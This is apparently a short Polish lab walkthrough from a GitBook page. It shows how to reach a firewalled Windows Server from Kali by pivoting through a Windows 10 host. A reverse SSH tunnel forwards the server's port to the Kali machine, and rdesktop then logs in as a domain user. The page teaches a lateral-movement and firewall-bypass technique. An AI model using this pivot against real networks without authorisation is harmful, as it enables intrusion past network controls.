---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# T4 - Win Server blokuje połączenia z Kaliego, wchodzimy poprzez Win10 do Win Serwera

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (1).jpg" alt=""><figcaption></figcaption></figure>

</div>

<div data-full-width="true">

<figure><img src=".gitbook/assets/2.jpg" alt=""><figcaption></figcaption></figure>

</div>

**Win** 10.20.10.4

```python
ssh -R 2137:10.20.10.5:2289 kali@10.20.10.31
```

**Kali** 10.20.10.31

```python
rdesktop -d cyber -u jessicar 127.0.0.1:2137
#i mamy zdalny pulpit z Windows Server
```

<div data-full-width="true">

<figure><img src=".gitbook/assets/1 (2).jpg" alt=""><figcaption></figcaption></figure>

</div>
